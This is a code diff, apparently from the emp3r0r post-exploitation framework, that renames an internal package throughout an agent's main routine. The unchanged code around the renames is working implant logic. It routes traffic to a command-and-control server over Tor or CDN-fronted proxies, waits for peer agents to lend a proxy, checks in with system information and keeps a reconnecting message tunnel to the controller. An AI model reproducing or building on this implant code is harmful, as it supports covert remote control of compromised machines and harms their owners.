@@ -16,7 +16,7 @@ import (
 
 	"github.com/google/uuid"
 	"github.com/jm33-m0/emp3r0r/core/lib/agent"
-	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
+	emp3r0r_def "github.com/jm33-m0/emp3r0r/core/lib/emp3r0r_def"
 	"github.com/jm33-m0/emp3r0r/core/lib/tun"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 	cdn2proxy "github.com/jm33-m0/go-cdn2proxy"
@@ -184,13 +184,13 @@ func main() {
 			os.Setenv("HOME", u.HomeDir)
 		}
 
-		emp3r0r_data.DefaultShell = fmt.Sprintf("%s/bash", agent.RuntimeConfig.UtilsPath)
+		emp3r0r_def.DefaultShell = fmt.Sprintf("%s/bash", agent.RuntimeConfig.UtilsPath)
 		if runtime.GOOS == "windows" {
-			emp3r0r_data.DefaultShell = "elvish"
-		} else if !util.IsFileExist(emp3r0r_data.DefaultShell) {
-			emp3r0r_data.DefaultShell = "/bin/bash"
-			if !util.IsFileExist(emp3r0r_data.DefaultShell) {
-				emp3r0r_data.DefaultShell = "/bin/sh"
+			emp3r0r_def.DefaultShell = "elvish"
+		} else if !util.IsFileExist(emp3r0r_def.DefaultShell) {
+			emp3r0r_def.DefaultShell = "/bin/bash"
+			if !util.IsFileExist(emp3r0r_def.DefaultShell) {
+				emp3r0r_def.DefaultShell = "/bin/sh"
 			}
 		}
 
@@ -252,21 +252,21 @@ test_agent:
 	}
 
 	// if CC is behind tor, a proxy is needed
-	if tun.IsTor(emp3r0r_data.CCAddress) {
+	if tun.IsTor(emp3r0r_def.CCAddress) {
 		// if CC is on Tor, CCPort won't be used since Tor handles forwarding
 		// by default we use 443, so configure your torrc accordingly
-		emp3r0r_data.CCAddress = fmt.Sprintf("%s/", emp3r0r_data.CCAddress)
-		log.Printf("CC is on TOR: %s", emp3r0r_data.CCAddress)
+		emp3r0r_def.CCAddress = fmt.Sprintf("%s/", emp3r0r_def.CCAddress)
+		log.Printf("CC is on TOR: %s", emp3r0r_def.CCAddress)
 		if agent.RuntimeConfig.C2TransportProxy == "" {
 			agent.RuntimeConfig.C2TransportProxy = "socks5://127.0.0.1:9050"
 		}
-		log.Printf("CC is on TOR (%s), using %s as TOR proxy", emp3r0r_data.CCAddress, agent.RuntimeConfig.C2TransportProxy)
+		log.Printf("CC is on TOR (%s), using %s as TOR proxy", emp3r0r_def.CCAddress, agent.RuntimeConfig.C2TransportProxy)
 	} else {
 		// parse C2 address
 		// append CCPort to CCAddress
-		emp3r0r_data.CCAddress = fmt.Sprintf("%s:%s/", emp3r0r_data.CCAddress, agent.RuntimeConfig.CCPort)
+		emp3r0r_def.CCAddress = fmt.Sprintf("%s:%s/", emp3r0r_def.CCAddress, agent.RuntimeConfig.CCPort)
 	}
-	log.Printf("CCAddress is: %s", emp3r0r_data.CCAddress)
+	log.Printf("CCAddress is: %s", emp3r0r_def.CCAddress)
 
 	// DNS
 	if agent.RuntimeConfig.DoHServer != "" {
@@ -290,7 +290,7 @@ test_agent:
 			dns = agent.RuntimeConfig.DoHServer
 		}
 		go func() {
-			for !tun.IsProxyOK(cdnproxyAddr, emp3r0r_data.CCAddress) {
+			for !tun.IsProxyOK(cdnproxyAddr, emp3r0r_def.CCAddress) {
 				// typically you need to configure AgentProxy manually if agent doesn't have internet
 				// and AgentProxy will be used for websocket connection, then replaced with 10888
 				err := cdn2proxy.StartProxy(strings.Split(cdnproxyAddr, "socks5://")[1], agent.RuntimeConfig.CDNProxy, upper_proxy, dns)
@@ -324,8 +324,8 @@ test_agent:
 			}
 			return true
 
-		} else if !tun.IsTor(emp3r0r_data.CCAddress) &&
-			!tun.IsProxyOK(agent.RuntimeConfig.C2TransportProxy, emp3r0r_data.CCAddress) {
+		} else if !tun.IsTor(emp3r0r_def.CCAddress) &&
+			!tun.IsProxyOK(agent.RuntimeConfig.C2TransportProxy, emp3r0r_def.CCAddress) {
 			// we don't, just wait for some other agents to help us
 			log.Println("[-] We don't have internet access, waiting for other agents to give us a proxy...")
 			if *cnt == 0 {
@@ -356,8 +356,8 @@ test_agent:
 
 connect:
 	// apply whatever proxy setting we have just added
-	emp3r0r_data.HTTPClient = tun.EmpHTTPClient(emp3r0r_data.CCAddress, agent.RuntimeConfig.C2TransportProxy)
-	if emp3r0r_data.HTTPClient == nil {
+	emp3r0r_def.HTTPClient = tun.EmpHTTPClient(emp3r0r_def.CCAddress, agent.RuntimeConfig.C2TransportProxy)
+	if emp3r0r_def.HTTPClient == nil {
 		log.Printf("[-] Failed to create HTTP2 client, sleeping, will retry later")
 		util.TakeASnap()
 		goto connect
@@ -382,7 +382,7 @@ connect:
 			goto connect
 		}
 	}
-	log.Printf("Checking in on %s", emp3r0r_data.CCAddress)
+	log.Printf("Checking in on %s", emp3r0r_def.CCAddress)
 
 	// check in with system info
 	err = agent.CheckIn()
@@ -391,22 +391,22 @@ connect:
 		util.TakeASnap()
 		goto connect
 	}
-	log.Printf("Checked in on CC: %s", emp3r0r_data.CCAddress)
+	log.Printf("Checked in on CC: %s", emp3r0r_def.CCAddress)
 
 	// connect to MsgAPI, the JSON based h2 tunnel
 	token := uuid.NewString() // dummy token
 	msgURL := fmt.Sprintf("%s%s/%s",
-		emp3r0r_data.CCAddress,
+		emp3r0r_def.CCAddress,
 		tun.MsgAPI,
 		token)
 	conn, ctx, cancel, err := agent.ConnectCC(msgURL)
-	emp3r0r_data.CCMsgConn = conn
+	emp3r0r_def.CCMsgConn = conn
 	if err != nil {
 		log.Printf("Connect CC failed: %v, sleeping, will retry later", err)
 		util.TakeASnap()
 		goto connect
 	}
-	emp3r0r_data.KCPKeep = true
+	emp3r0r_def.KCPKeep = true
 	log.Println("Connecting to CC NsgTun...")
 	agent.CCMsgTun(ctx, cancel)
 	log.Printf("CC MsgTun closed, reconnecting")
